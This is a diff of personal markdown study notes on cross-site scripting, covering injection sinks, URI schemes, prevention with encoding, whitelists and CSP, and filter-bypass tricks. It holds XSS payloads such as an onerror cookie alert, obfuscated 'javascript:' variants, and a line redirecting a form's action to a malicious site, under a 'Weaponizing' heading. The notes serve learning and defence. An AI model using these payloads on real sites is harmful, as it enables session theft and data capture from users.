@@ -37,6 +37,8 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 - Content security policy to prevent XSS?
 - Dangling markup injections?
 - Why double url encode?
+- Is there a way to do a URI based XSS when the link has `?` in front?
+	- `<a href="?javascript:alert()"` doesn't work
 
 - Todo
 	- HTML encoding(Ex: change `<`s to `&lt;`) vs HTML sanitization(Allowing some html elements, but not all)
@@ -47,64 +49,37 @@ R<h1>This is NOT a PDF!</h1> <img src=x onerror=alert(document.cookie)>
 	- [URL parameter XSS](#url-parameter-xss)
 	- [Common payloads](#common-payloads)
 	- [Different types of Sinks - Where user input is used](#different-types-of-sinks---where-user-input-is-used)
-		- [Inside html entities](#inside-html-entities)
+		- [Inside html elements](#inside-html-elements)
 		- [Inside html attributes](#inside-html-attributes)
 			- [Uniform Resource IdentifierURIs](#uniform-resource-identifieruris)
 		- [Inside Javascript](#inside-javascript)
 		- [Inside CSS](#inside-css)
+	- [Easy ways to prevent XSS](#easy-ways-to-prevent-xss)
+		- [Content Security Policy CSPs](#content-security-policy-csps)
+	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
 	- [Weaponizing XSS payloads](#weaponizing-xss-payloads)
 		- [Stealing information](#stealing-information)
 			- [Key logger](#key-logger)
 		- [What information to steal](#what-information-to-steal)
 		- [Manipulating actions](#manipulating-actions)
-	- [Prevent XSS attacks](#prevent-xss-attacks)
+	- [HTML encodingsearch and replace vs HTML sanitizationAllowing some elements](#html-encodingsearch-and-replace-vs-html-sanitizationallowing-some-elements)
+	- [File upload vulnerabilities](#file-upload-vulnerabilities)
 	- [Reference table](#reference-table)
-	- [Bypassing common XSS filters](#bypassing-common-xss-filters)
-	- [Checklist](#checklist)
-	- [Javascript special strings syntax](#javascript-special-strings-syntax)
 
 <!-- /TOC -->
 
 --------------------------------------------------------------------------------
-- Define XSS
-	- URL parameter based
-	- Database based
-
-- URL parameter based XSS
-
-- Common payloads
-
+Todo
 - Different types Sinks
-	- HTML elements
-	- HTML attributes
 	- Javascript
 		- innerHTML
 	- CSS
-
-- Easy ways to prevent XSS
-	- Don't use URL params
-	- Follow the common prevention techniques for the different sinks
-	- Content Security Policy(CSPs)
-		- Sent by server in the header in every response
-		- Allows us to specigy exactly what sources are trusted and disable any inline resources
-
-- Bypassing common XSS filters
-	- Trying the same character multiple times(replace vs replaceAll)
-	- Avoiding commonly used XSS attacks
-		- Try something other than
-			- `alert()`
-			- `<script>`
-			- `javascript:`
-
-- Weaponizing XSS
 
 - HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)
 
 - File upload vulnerabilities
 	- SVGs
 	- PDFs
-
-- Reference table
 
 --------------------------------------------------------------------------------
 
@@ -150,7 +125,7 @@ Possible html output
 
 ## Different types of Sinks - Where user input is used
 
-### Inside html entities
+### Inside html elements
 - Ex: `<p>{userInput}</p>`
 
 In order to prevent this the server should filter out any `<`s
@@ -161,6 +136,8 @@ In order to prevent this the server should filter out any `<`s
 - Ex: `<a src="{user input}">Link</a>`
 - Ex2: `<input value="{user input}">`
 
+In order to perform an XSS attack you can either use URIs or escape the attribute with `"`, `'`, or `s
+
 In order to prevent this the server should filter out any `<`s and `"`s as well as have a whitelist of URIs
 - Ex: `userInput = userInput.replaceAll("<", "&lt;").replaceAll('"', "&quot;")`
 - This works because no html entity can start without a `<`
@@ -168,28 +145,40 @@ In order to prevent this the server should filter out any `<`s and `"`s as well 
 #### Uniform Resource Identifier(URIs)
 - URIs are often used for attributes which can access the internet
 	- `src`, `href`, `action`, `data`, `formaction`, `poster`, `manifest`, `ping`, `cite`, `usemap`
-- `javascript:print()`
-- Doesn't work on modern browsers
-	- `data:[<mediatype>][;base64],<data>`
-		- `data:image/svg+xml;utf8,<svg content>`
-		- `data:text/html;base64,PHNjcmlwdD5wcmludCgpPC9zY3JpcHQ+`
-		- `data:text/html,<script>print()</script>`
-	- `vbscript:MsgBox('XSS')` or `vbscript:msgbox('XSS')`
-	- `livescript:[code]`
+- URIs can also be used for many event based attributes
+	- Ex: `<button onclick="javascript:alert()">`
+- URIs cannot be used for `<input value="{user input}">`
+- URIs
+	- `javascript:print()`
+	- Doesn't work on modern browsers
+		- `data:[<mediatype>][;base64],<data>`
+			- `data:image/svg+xml;utf8,<svg content>`
+			- `data:text/html;base64,PHNjcmlwdD5wcmludCgpPC9zY3JpcHQ+`
+			- `data:text/html,<script>print()</script>`
+		- `vbscript:MsgBox('XSS')` or `vbscript:msgbox('XSS')`
+		- `livescript:[code]`
 
 In order to prevent URI attacks there should be a whitelist of acceptable URIs and not a blacklist.
 - Why not use a Blacklist
 	- There are lots of non-standard URIs for different browser
 	- There could be more unsafe URIs in the future
 	- There can be unique ways of encoding URIs
-		- Ex: `jAvAsCrIpT:`, `javas%09cript:`,	`javas]]<![CDATA[cript:`
-			- `%09`, `%00`, `%20`, `%10`, `\0`
+		- Ex: `jAvAsCrIpT:`, `javas%09cript:`,	`javas]]<![CDATA[cript:`, `javascript:javascript:`
+			- `%09`, `%00`, `%20`, `%10`, or `\0`
+			- `?javascript:` does not work
 - Common whitelist used by Wordpress
 	- `http`, `https`, `ftp`, `ftps`, `mailto`, `news`, `irc`, `gopher`, `nntp`, `feed`, `telnet`, `mms`, `rtsp`, `svn`, `tel`, `fax`, `xmpp`
 
-Js code for whitelist?
-- If it begins with a specific URI?
-	- Could you do `https://javascript:alert()`
+```javascript
+	let uriWhitelist = ["http://", "https://"]
+	let validUserInput = false
+	for(const uri of uriWhitelist){
+		if(userInput.startsWith(uri)){
+			validUserInput = true
+			break
+		}
+	}
+```
 
 ### Inside Javascript
 - Ex:
@@ -208,8 +197,46 @@ const param2 = params.get('param2')
 - Sinks
 	- innerHTML
 
+	Avoid using `element.innerHTML = userInput;` and instead use `element.innerText = userInput;`
+		- This doesn't work if the element is a script?
+
 ### Inside CSS
 	- Not very common
+
+## Easy ways to prevent XSS
+- Pass information through the body instead of through URL parameters
+- Be very cautious when using react's `dangerouslySetInnerHTML`
+- Follow the common prevention techniques for the different sinks
+	- Use `<input value="userInput">` to prevent URI attacks(Still need to search and replace).
+- Use whitelists and/or blacklists for allowable data
+- Use Content Security Policy
+
+### Content Security Policy (CSPs)
+- Sent by server in the header in every response
+- Allows us to specify exactly what sources are trusted and disable any inline resources
+- Can distinguish between legitimate inputs and injected JS code
+
+## Bypassing common XSS filters
+- Trying the same character multiple times(replace vs replaceAll)
+- Avoiding commonly used XSS attacks
+	- Try something other than
+		- `alert()`
+		- `<script>`
+		- `javascript:`
+- Avoid using `()`s
+	- alert\`\`, print\`\`, confirm\`\`
+
+- Filtering out tags
+	- Test all the tag
+- Filter out events
+	- Test all the events
+- Filtering out special characters
+	- Test alternatives to special character
+
+See [XXS Tests](./xss_tests.md)
+
+- It is often times worth try to double URL encode you input.
+	- Why?
 
 ## Weaponizing XSS payloads
 
@@ -241,104 +268,34 @@ document.addEventListener('keydown', (event) => {
 	- Changing action(where info is sent) of a form: `document.getElementById('theform').action='https://malicious-site.com'`
 - `}</script>`
 
-## Prevent XSS attacks
-- Pass information through the body instead of through URL parameters
 
-- Don't use react's `dangerouslySetInnerHTML`
-- Filter input as strictly as possible.
-	- Use a whitelist to only allow certain characters or words.
-	- Search and replace with HTML
-		- `&` to `&amp;`
-		- `<` to `&lt;`
-		- `>` to `&gt;`
-		- `"` to `&quot;`
-		- `'` to  `&#x27;`
-	- Search and replace with JS
-		- `&` to `\u0026`
-		- `<` to `\u003c`
-		- `>` to `\u003e`
-		- `"` to  `\u0022`
-		- `'` to  `\u0027`
-- Instead of `element.innerHTML = userInput;` use:
-	- `element.innerText = userInput;`
-	- `let textNode = document.createTextNode(userInput); element.appendChild(textNode);`
-	- Note: These DO NOT work if the element is a script element as the text will be executed as JS.
+## HTML encoding(search and replace) vs HTML sanitization(Allowing some elements)
+- **HTML encoding** - Search and replace key characters to prevent XSS
+- **HTML Sanitization** - Some user input need to allow certain HTML elements.
+	- It can be very difficult to prevent XSS attacks. Often whitelists are used to prevent malicious HTML elements, but this may not be set up correctly.
+	- Ex: Stylized emails with HTML and CSS
 
-- Use Content-Security Policy(CSPs)
-	- Can distinguish between legitimate inputs and injected JS code
-	- 
-
-Use `<input value="userInput">`
-
-which is an additional header in the server or specified in the html which only allows certain 
-	- This only limits what XSS can do. It might not prevent it.
-
---------------------------------------------------------------------------------
+## File upload vulnerabilities
+- SVGs
+- PDFs
 
 ## Reference table
 
-| Symbol | HTML name | HTML code | HTML hex code |           | URL   | JS Unicode | JS Hex | JS Oct |
-|--------|-------------------|-------|------------|--------|--------|
-| `"`    | `&quot;` , `&#34` | `%22` |            |        |        |
-| `&`    | `&amp;`           | `%26` |            |        |        |
+- Same number as URL(Hex)
+	- HTML hex
+		- Ex: `&#x22;`
+	- JS Unicode
+		- Ex: `\u0022`
+	- JS Hex
+		- Ex: `\x22`
 
-| `%`    | `&
-| `'`    |
-
-" , `&lpar;`, `&rpar;`
-HTML hex code: `&#x6A`
-
-- Unicode(ASCII hex)
-	- `<`: `\u003C`
-- Hexadecimal
-	- `<`: `\x3c`
-- Octal
-	- `<`: `\074`
-
-| Filtered symbol | Try instead                                      |
-|-----------------|--------------------------------------------------|
-| `"`s or `'`s    | `&quot;`, `&lpar;` and `&rpar;`, `%27`, or `%22` |
-| `<`s            | `&lt;`, `%3C`, or `\x3c`                         |
-| `>`s            | `&gt;`, `%3E`, or `\x3e`                         |
-| `\`s            | `\\`                                             |
-| `(`s and `)`s   |                                                  |
-| `&`s            | `%26` , `&amp;`                                  |
-| `%`s            |                                                  |
-| `.`s            |                                                  |
-| `=`s            |                                                  |
-
-## Bypassing common XSS filters
-- Filtering out tags
-	- Test all the tag
-- Filter out events
-	- Test all the events
-- Filtering out special characters
-	- Test alternatives to special character
-
-See [XXS Tests](./xss_tests.md)
-
-Often times inputs are filtered to remove or replace certain characters. This usually means that that input isn't susceptible to XSS attacks, however the filter might not be set up correctly.
-
-
-Sometimes you need to add `">` or `'>` in front of your attacks as an escape sequence.
-
-- It is often times worth try to double URL encode you input.
-
---------------------------------------------------------------------------------
-
-## Checklist
-URl Parameter XSS:
-1. Put unique string in URL parameter: `NkgM41FlLR`
-2. Find a URL parameter that puts its output to the DOM.
-	- Do ctrl+f in inspect element DOM to check for hidden DOM elements that contain the parameter.
-3. Search in client JS for code which gets the query parameter.
-4. Filter in Burp Suit for any responses containing the unique string.
-5. Test basic XSS attacks
-6. Figure out which characters are being filtered out and test alternative representations of those characters.
-
-Stored XSS:
-1. Create 2 accounts and log in. One in private browser.
-2. Attacking account posts XSS attack.
-3. 2nd account checks the post to see if it runs.
-
-## Javascript special strings syntax
+| Symbol | HTML name | HTML code | URL   |
+|--------|-----------|-----------|-------|
+| `%`    |           | `&#37;`   | `%25` |
+| `"`    | `&quot;`  | `&#34;`   | `%22` |
+| `&`    | `&amp;`   | `&#38;`   | `%26` |
+| `'`    | `&apos;`  | `&#39;`   | `%27` |
+| `<`    | `&lt;`    | `&#60;`   | `%3C` |
+| `>`    | `&gt;`    | `&#62;`   | `%3E` |
+| `\`    |           | `&#92;`   | `%5C` |
+| `#`    |           | `&#35;`   | `%23` |
